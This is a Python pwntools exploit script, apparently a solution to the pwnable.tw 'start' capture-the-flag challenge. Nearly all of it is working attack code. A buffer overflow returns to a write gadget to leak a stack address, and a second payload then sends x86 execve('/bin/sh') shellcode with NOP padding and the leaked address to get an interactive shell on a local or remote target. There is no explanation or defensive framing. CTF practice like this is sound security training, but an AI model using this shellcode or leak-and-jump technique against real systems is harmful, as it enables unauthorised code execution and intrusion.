from pwn import *
import sys

HOST = 'chall.pwnable.tw'
PORT = 10000

BUFF = 'a'*20
WRITE_RET = p32(0x0804808b)
NOP = '\x90'
SHELL_CODE = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def exploit(p):
    payload = BUFF + WRITE_RET
    p.send(payload)
    p.recvuntil(WRITE_RET)
    data = p.recv()
    leaked_addr = data[: 4]
    leaked_addr = p32(u32(leaked_addr)-28)
    info('leaked address is {:x}'.format(u32(leaked_addr)))
    pause()
    payload = SHELL_CODE
    payload += NOP*23
    payload += leaked_addr       # be aware of another 'add esp, 0x14'
    p.sendline(payload)
    p.interactive()

if __name__=='__main__':
    if len(sys.argv)==1:        # default local
        p = process(['./start'])
        pause()
        exploit(p)
    elif sys.argv[1]=='remote':       # remote
        p = remote(HOST, PORT)
        exploit(p)
